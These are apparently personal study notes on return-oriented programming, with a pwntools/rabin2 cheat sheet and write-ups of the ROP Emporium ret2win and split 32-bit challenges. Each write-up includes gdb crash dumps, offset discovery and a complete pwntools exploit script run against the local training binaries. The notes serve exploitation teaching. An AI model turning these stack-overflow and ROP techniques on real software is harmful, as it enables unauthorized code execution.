# ROP Resources

### Introduction
https://en.wikipedia.org/wiki/Return-oriented_programming    

### John Hammond ROP walkthrough
https://www.youtube.com/watch?v=i5-cWI_HV8o  

### ROP Basics

> Thanks to [Legacyy](https://github.com/iilegacyyii) for helping me learn ROP Binary Exploitation

```
from pwn import *

process("./vuln") #open a binary
remote("127.0.0.1", 1337) #will connect to service at 127.0.0.1 at 1337

p.sendline(buf) # sends data of buf
p.recv() # receive everything
p.recvuntil("> ") # receive a string up until a given string (requires a param)
p.interactive() # allows the user to interact with the binary
p32() # packs an address in little endian format for 32bit
p64() # packs an address in little endian format for 64bit

ROPgadget --binary <binaryname> # to retrieve a list of gadgets

rabin2 -S binary # sections (e.g .data)
rabin2 -R binary # relocations (similar to imports e.g relro)
rabin2 -i binary # imports (Anything imported)
rabin2 -z binary # vaddresses with strings
```

# ROP Adventures from ropemporium.com


# ROP Challenge (ret2win 32bit)

https://ropemporium.com/challenge/ret2win.html

### objective: Try to obtain the flag by taking advantage of the ret2win function

### Testing the app

Triggering the segment fault using gdb

```asm
gdb-peda$ r
Starting program: /ret2win/ret2win32 
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa8000 --> 0x1e4d6c 
EDI: 0xf7fa8000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd690 ("AAAAAA\n\377")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd690 ("AAAAAA\n\377")
0004| 0xffffd694 --> 0xff0a4141 
0008| 0xffffd698 --> 0x0 
0012| 0xffffd69c --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
0016| 0xffffd6a0 --> 0xf7fa8000 --> 0x1e4d6c 
0020| 0xffffd6a4 --> 0xf7fa8000 --> 0x1e4d6c 
0024| 0xffffd6a8 --> 0x0 
0028| 0xffffd6ac --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

### understanding what's being overwritten

Using python to generate 40 bytes of A's, 4 Bytes of B's and 4 Bytes of C's.

```python
>>> print "A"*40 + "B"*4 + "C"*4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
```

Below code will show us that EBP has been overwritten with B's and the EIP has been overwritten with C's. We now know the returning instruction (EIP) we have control of. After 44 bytes we can now send over our payload.

```asm
gdb-peda$ r
Starting program: /ret2win/ret2win32 
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa8000 --> 0x1e4d6c 
EDI: 0xf7fa8000 --> 0x1e4d6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xffffd690 --> 0xf7fe400a ((bad))
EIP: 0x43434343 ('CCCC')  <--- the return instruction
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xffffd690 --> 0xf7fe400a ((bad))
0004| 0xffffd694 --> 0xffffd6b0 --> 0x1 
0008| 0xffffd698 --> 0x0 
0012| 0xffffd69c --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
0016| 0xffffd6a0 --> 0xf7fa8000 --> 0x1e4d6c 
0020| 0xffffd6a4 --> 0xf7fa8000 --> 0x1e4d6c 
0024| 0xffffd6a8 --> 0x0 
0028| 0xffffd6ac --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
```

### What is the payload?

```asm
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win <-- function to obtain the flag, we will need to return to 0x0804862c
0x08048660  __libc_csu_init
0x080486c0  __libc_csu_fini
0x080486c4  _fini
gdb-peda$ 
```

Let's craft a script to automate our exploitation

```python

from pwn import *

p = process("./ret2win32") # Calling the ret2win binary

ret2win = p32(0x0804862c) # setting variable ret2win as address for function ret2win

buf = b"" 
buf += b"A"*44 # filling the buffer with 44 bytes of A's
buf += ret2win # ret2win function as our returning instruction

p.sendline(buf) # sends the payload to the binary
p.interactive() # makes the session interactive
```

### Mission complete

```asm
[+] Starting local process './ret2win32': pid 8034
[*] Switching to interactive mode
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

# ROP Challenge (split 32bit)

https://ropemporium.com/challenge/split.html

### objective: obtain the flag by utilizing the system function and providing the "/bin/cat flag.txt" as an argument.

### Testing the app

triggering the segment fault using gdb

```asm
gdb-peda$ r
Starting program: /split/split32 
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa8000 --> 0x1e4d6c 
EDI: 0xf7fa8000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd6a0 ('A' <repeats 25 times>, "\n")
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd6a0 ('A' <repeats 25 times>, "\n")
0004| 0xffffd6a4 ('A' <repeats 21 times>, "\n")
0008| 0xffffd6a8 ('A' <repeats 17 times>, "\n")
0012| 0xffffd6ac ('A' <repeats 13 times>, "\n")
0016| 0xffffd6b0 ("AAAAAAAAA\n")
0020| 0xffffd6b4 ("AAAAA\n")
0024| 0xffffd6b8 --> 0xa41 ('A\n')
0028| 0xffffd6bc --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

Using python to generate 40 bytes of A's, 4 Bytes of B's and 4 Bytes of C's.

```python
>>> print "A"*40 + "B"*4 + "C"*4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
```

Same as the previous challenge, it took 44 bytes before taking control of the return instruction (EIP)

```asm
gdb-peda$ r
Starting program: /split/split32 
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa8000 --> 0x1e4d6c 
EDI: 0xf7fa8000 --> 0x1e4d6c 
EBP: 0x42424242 ('BBBB')
ESP: 0xffffd6a0 --> 0xf7fe400a ((bad))
EIP: 0x43434343 ('CCCC')  <---- the return instruction
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xffffd6a0 --> 0xf7fe400a ((bad))
0004| 0xffffd6a4 --> 0xffffd6c0 --> 0x1 
0008| 0xffffd6a8 --> 0x0 
0012| 0xffffd6ac --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
0016| 0xffffd6b0 --> 0xf7fa8000 --> 0x1e4d6c 
0020| 0xffffd6b4 --> 0xf7fa8000 --> 0x1e4d6c 
0024| 0xffffd6b8 --> 0x0 
0028| 0xffffd6bc --> 0xf7de1df6 (<__libc_start_main+262>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
```

### Where is the system function?

```asm
gdb-peda$ info func
All defined functions:

Non-debugging symbols:
0x08048374  _init
0x080483b0  read@plt
0x080483c0  printf@plt
0x080483d0  puts@plt
0x080483e0  system@plt <-- your system function is located here this will be the return instruction
0x080483f0  __libc_start_main@plt
0x08048400  setvbuf@plt
0x08048410  memset@plt
0x08048420  __gmon_start__@plt
0x08048430  _start
0x08048470  _dl_relocate_static_pie
0x08048480  __x86.get_pc_thunk.bx
0x08048490  deregister_tm_clones
0x080484d0  register_tm_clones
0x08048510  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048546  main
0x080485ad  pwnme
0x0804860c  usefulFunction
0x08048630  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048694  _fini
```

### What's next?

Now that we have the return instruction "0x080483e0" we can now locate the address of where "/bin/cat flag.txt". Below is the virtual address.

```asm
root@kali:/split# rabin2 -z split32
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
0   0x00001030 0x0804a030 <-- (Your Virtual Address) 17  18   .data   ascii /bin/cat flag.txt
```

### Crafting the exploit

Let's now use pwntools to craft our exploit

```python
from pwn import *

p = process("./split32")

buf = b""
buf += b"A"*44 # filling the buffer with 44 bytes of A's
buf += p32(0x080483e0) # calling the system function
buf += b"AAAA" # returning instruction for system function. I provided any value (4 bytes of A's)
buf += p32(0x0804a030) # /bin/cat flag.txt

p.sendline(buf)
p.interactive()
```

### mission complete

```
[+] Starting local process './split32': pid 8328
[*] Switching to interactive mode
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```
